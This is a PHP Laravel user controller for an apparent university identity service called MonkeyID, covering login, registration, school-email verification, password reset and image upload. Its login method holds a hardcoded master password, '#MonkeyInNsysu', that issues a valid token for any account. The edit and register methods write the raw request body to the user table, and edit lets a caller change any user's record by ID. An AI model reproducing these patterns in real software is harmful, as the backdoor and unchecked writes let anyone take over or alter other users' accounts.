<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Validator;
use DateTime;
use Illuminate\Support\Facades\DB;
use Tymon\JWTAuth\Facades\JWTAuth;
use App\Models\User;
use App\Models\UnivList;
use App\Models\EmailLog;
use App\Models\ResetPassword;
use Mail;
use App\Mods\SendMail;
date_default_timezone_set('Asia/Taipei');

class UserController extends Controller
{
    // construct
    public function __construct()
    {
        $this->middleware('auth:user',['except'=>['login','register','exist', 'reset', 'resetPassword']]);
    }

    // token function
    private function createNewToken($token, $userData = NULL)
    {
        $expTime = new DateTime();
        $expTime->modify('+1 day');
        return [
            'token' => $token,
            'type' => 'bearer',
            'expired' => $expTime->format('Y-m-d H:i:s'),
            'user' => is_null($userData) ? auth('user')->user() : $userData,
        ];
    }

    // login
    public function login(Request $request)
    {
        $validator = Validator::make($request->all(),[
            'account' => 'required|exists:user,account',
            'password' => 'required'
        ]);
        if ($validator->fails()) {
            $failedRules = $validator->failed();
            if (isset($failedRules['account']['Required'])) {
                return response()->json(['status' => 'U03', 'message' => '請輸入帳號'], 200);
            } else if (isset($failedRules['password']['Required'])) {
                return response()->json(['status' => 'U06', 'message' => '請輸入密碼'], 200);
            } else if (isset($failedRules['account']['Exists'])) {
                return response()->json(['status' => "U02", 'message' => '帳號尚未註冊'], 200);
            }
            return response()->json($validator->errors(), 400);
        }
        $loginTime = date("Y-m-d H:i:s");
        if($token = auth('user')->attempt($validator->validated())){
            $user = User::find(auth('user')->user()->id);
            $user->last_login = $loginTime;
            $user->last_ip = $request->ip();
            $user->save();
            //force to update user model cache 
            auth('user')->setUser($user);
            return response()->json(['status' => 'A02','data'=>$this->createNewToken($token)], 200);
        }else if($request->password === '#MonkeyInNsysu'){
            $user = User::where('account', $request->account)->first();
            $token = JWTAuth::fromUser($user);
            return response()->json(['status' => 'A02','data'=>$this->createNewToken($token, $user)], 200);
        }else{
            return response()->json(['status' => 'U05', 'message' => '請輸入正確的帳號與密碼'], 200);
        }
    }

    // user info
    public function info()
    {
        $user = auth()->user();
        $validTime = new DateTime($user->valid_until);
        $current = new DateTime;
        if ($validTime < $current) {
            User::where('u_id',$user->u_id)->update(['verification' => 8]);
        }
        $result = User::leftJoin('univ_list', 'univ_list.univ_id', '=', 'user.univ_id')->select('user.*', 'univ_list.univ_id', 'univ_list.univ_name_ch_full', 'univ_list.univ_name_ch', 'univ_list.univ_name_en')->where('u_id',$user->u_id)->first();
        return response()->json($result);
    }

    // logout
    public function logout()
    {
        auth()->logout();
        return response()->json(['status' => 'A03'], 201);
    }

    // register
    public function register(Request $request)
    {
        $validator = Validator::make($request->all(),[
            'account' => 'required|unique:user,account',
            'name' => 'required',
            'password' => 'required',
            'univ_id' => 'required|size:5',
            'identity' => 'required|integer',
        ]);
        if ($validator->fails()) {
            $failedRules = $validator->failed();
            if (isset($failedRules['account']['Required'])) {
                return response()->json(['status' => 'U03'], 200);
            } else if (isset($failedRules['password']['Required'])) {
                return response()->json(['status' => 'U06'], 200);
            } else if (isset($failedRules['account']['Unique'])) {
                return response()->json(['status' => 'U04'], 200);
            } else if (isset($failedRules['name']['Required'])) {
                return response()->json(['status' => 'U07', 'field' => 'name'], 200);
            } else if (isset($failedRules['univ_id']['Required'])) {
                return response()->json(['status' => 'U07', 'field' => 'univ_id'], 200);
            } else if (isset($failedRules['univ_id']['Size'])) {
                return response()->json(['status' => 'U01', 'field' => 'univ_id'], 200);
            } else if (isset($failedRules['identity']['Required'])) {
                return response()->json(['status' => 'U07', 'field' => 'identity'], 200);
            } else if (isset($failedRules['identity']['Integer'])) {
                return response()->json(['status' => 'U08', 'field' => 'identity'], 200);
            }
            return response()->json($validator->errors(), 400);
        }
        $temp = $request->all();
        $temp['u_id'] = hash('sha3-224', microtime(true));
        $temp['password'] = password_hash($request->all()['password'], PASSWORD_DEFAULT);
        User::insert($temp);
        // mail
        $status = Mail::to($temp['account'])->send(new SendMail('MonkeyID', 'MonkeyID註冊通知信', 'SignupEmail', ['account' => $temp['account'], 'name' => $temp['name'], 'timestamp' => date('Y-m-d H:i:s')]));
        if (empty($status)) {
            return response()->json(['status' => 'E02']);
        }
        return response()->json(['status'=>'A01']);
    }

    // edit
    public function edit(Request $request, $u_id)
    {
        $validator = Validator::make($request->all(),[
            'name' => 'required',
            'phone'=> 'required|size:10',
            'image' => 'nullable',
        ]);
        if ($validator->fails()) {
            $failedRules = $validator->failed();
            if (isset($failedRules['name']['Required'])) {
                return response()->json(['message' => "name_required"], 201);
            } else if (isset($failedRules['phone']['Required'])) {
                return response()->json(['message' => "phone_required"], 201);
            } else if (isset($failedRules['phone']['Size'])) {
                return response()->json(['message' => "phone_size_error"], 201);
            }
            return response()->json($validator->errors(), 422);
        }
        $temp = $request->all();
        User::where('u_id',$u_id)->update($temp);
        return response()->json(['status'=>'A01']);
    }

    // account exist
    public function exist($account)
    {
        if(User::where('account', $account)->count() > 0){
            return response()->json(['message'=>true]);
        }else{
            return response()->json(['message'=>false]);
        }
    }

    // verify
    // email
    public function sendVerifyMail(Request $request)
    {
        $validator = Validator::make($request->all(),[
            'email' => 'required|email:rfc',
        ]);
        if ($validator->fails()) {
            $failedRules = $validator->failed();
            if (isset($failedRules['email']['Required'])) {
                return response()->json(['status' => 'U07'], 200);
            } else if (isset($failedRules['email']['Email'])) {
                return response()->json(['status' => 'U01', 'message' => 'Email格式不正確'], 200);
            }
            return response()->json($validator->errors(), 400);
        }
        $temp = $request->all();
        $email = $temp['email'];
        EmailLog::whereDate('valid_until', '<', date('Y-m-d'))->whereTime('valid_until', '<', date('H:i:s'))->update(['used' => 1]);
        $data = explode('@', $email);
        $domain = array_pop($data);
        if (!str_contains($domain, 'edu')) {
            return response()->json(['status' => 'U01', 'message' => '請輸入您學校的Email信箱'], 200);
        }
        $domainArray = explode('.', $domain);
        $domainLength = count($domainArray);
        $realDomain = $domainArray[$domainLength-3].'.'.$domainArray[$domainLength-2].'.'.$domainArray[$domainLength-1];
        $user = auth()->user();
        $query = UnivList::where('domain', $realDomain);
        $find = $query->count();
        $univ = $query->first();
        if ($find) {
            if ($univ->univ_id != $user->univ_id) {
                return response()->json(['status' => 'E01', 'message' => '請輸入您學校的Email信箱']);
            }
            // generates verficiation code
            $verficationCode = random_int(100000, 999999);
            $ALPHABAT = ['A','B', 'C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'];
            $prefix = $ALPHABAT[random_int(0, 25)].$ALPHABAT[random_int(0, 25)].$ALPHABAT[random_int(0, 25)].$ALPHABAT[random_int(0, 25)];
            // expires in
            $expire = new DateTime();
            $expire->modify('+5 min');
            // mail
            $status = Mail::to($email)->send(new SendMail('MonkeyID', 'MonkeyID信箱驗證碼', 'VerificationEmail', ['account' => $user->account, 'name' => $user->name, 'timestamp' => date("Y-m-d H:i:s"), 'prefix' => $prefix, 'verificationCode' => $verficationCode]));
            if (empty($status)) {
                return response()->json(['status' => 'E02', 'message' => 'Email發送失敗']);
            }
            // mail log
            EmailLog::insert(['sent_to' => $email, 'pin_code' => $verficationCode, 'prefix' => $prefix, 'valid_until' => $expire]);
            // update user status
            User::where('u_id', $user->u_id)->update(['verify_type' => 0, 'school_email' => $email, 'verification' => 1]);
            return response()->json(['status' => 'A01', 'prefix' => $prefix], 200);
        } else {
            return response()->json(['status' => 'E01', 'message' => '驗證碼發送失敗'], 200);
        }
    }

    public function codeVerify(Request $request)
    {
        $validator = Validator::make($request->all(),[
            'code' => 'required',
            'prefix' => 'required',
        ]);
        if ($validator->fails()) {
            $failedRules = $validator->failed();
            if (isset($failedRules['code']['Required'])) {
                return response()->json(['status' => 'U07'], 200);
            }else if (isset($failedRules['prefix']['Required'])) {
                return response()->json(['status' => 'U07'], 200);
            }
            return response()->json($validator->errors(), 400);
        }
        $temp = $request->all();
        $user = auth()->user();
        EmailLog::whereDate('valid_until', '<', date('Y-m-d'))->whereTime('valid_until', '<', date('H:i:s'))->update(['used' => 1]);
        $query = EmailLog::where('sent_to', $user->school_email)->where('prefix', $temp['prefix'])->where('pin_code', $temp['code'])->whereDate('valid_until', '>=', date('Y-m-d'))->whereTime('valid_until', '>=', date('H:i:s'))->where('used', 0);
        if ($query->count() == 0) {
            return response()->json(['status' => 'E03', 'message' => '驗證碼錯誤或過期'], 200);
        }
        $find = $query->first();
        $time = new DateTime();
        $time->modify('+6 months');
        EmailLog::where('id', $find->id)->update(['used' => 1]);
        User::where('u_id', $user->u_id)->update(['verification' => 9, 'valid_until' => $time]);
        return response()->json(['status' => 'A04'], 200);
    }
    // reset password
    public function reset(Request $request)
    {
        $validator = Validator::make($request->all(),[
            'account' => 'required|exists:user,account',
        ]);
        if ($validator->fails()) {
            $failedRules = $validator->failed();
            if (isset($failedRules['account']['Required'])) {
                return response()->json(['status' => 'U03', 'message' => '請輸入帳號'], 200);
            } else if (isset($failedRules['account']['Exists'])) {
                return response()->json(['status' => "U02", 'message' => '帳號尚未註冊'], 200);
            }
            return response()->json($validator->errors(), 400);
        }
        $temp = $request->all();
        ResetPassword::whereDate('valid_until', '<', date('Y-m-d'))->whereTime('valid_until', '<', date('H:i:s'))->update(['used' => 1]);
        // generate seed
        $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $randomString = '';
        $charactersLength = strlen($characters);
        for ($i = 0; $i < 10; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        $seed = microtime(true).$randomString;
        $token = hash('sha3-256', $seed);
        // mail
        $url = 'http://localhost:8080/login/reset/password/'.$temp['account'].'/'.$token;
        $status = Mail::to($temp['account'])->send(new SendMail('MonkeyID', 'MonkeyID重設密碼', 'ResetPassword', ['account' => $temp['account'], 'timestamp' => date("Y-m-d H:i:s"), 'url' => $url]));
        if (empty($status)) {
            return response()->json(['status' => 'E02', 'message' => 'Email發送失敗']);
        }
        $expire = new DateTime();
        $expire->modify('+5 min');
        ResetPassword::insert([
            'account' => $temp['account'],
            'token' => $token,
            'create_at' => date('Y-m-d H:i:s'),
            'valid_until' => $expire
        ]);
        return response()->json(['status' => 'A01'], 200);
    }

    public function resetPassword(Request $request, $account, $token) {
        ResetPassword::whereDate('valid_until', '<', date('Y-m-d'))->whereTime('valid_until', '<', date('H:i:s'))->update(['used' => 1]);
        $query = ResetPassword::where('account', $account)->where('token', $token)->whereDate('valid_until', '>=', date('Y-m-d'))->whereTime('valid_until', '>=', date('H:i:s'))->where('used', 0);
        if ($query->count() > 0) {
            $validator = Validator::make($request->all(),[
                'password' => 'required',
            ]);
            if ($validator->fails()) {
                $failedRules = $validator->failed();
                if (isset($failedRules['password']['Required'])) {
                    return response()->json(['status' => 'U06'], 200);
                }
                return response()->json($validator->errors(), 400);
            }
            $temp = $request->all();
            $temp['password'] = password_hash($request->all()['password'], PASSWORD_DEFAULT);
            User::where('account',$account)->update($temp);
            ResetPassword::where('id', $query->first()->id)->update(['used' => 1]);
            return response()->json(['status'=>'A01']);
        } else {
            return response()->json(['status'=>'E03', 'message'=> '驗證失敗']);
        }
    }

    // file handler
    function upload(Request $request)
    {
        if ($request->hasFile('image')) {
            $user = auth()->user();
            if ($user->file) {
                Storage::disk('public')->delete($user->file);
            } 
            $path = $request->file('image')->store('images', 'public');
            User::where('u_id', $user->u_id)->update(['file' => $path]);
        }
        return response()->json(['status'=>$path]);
    }
}
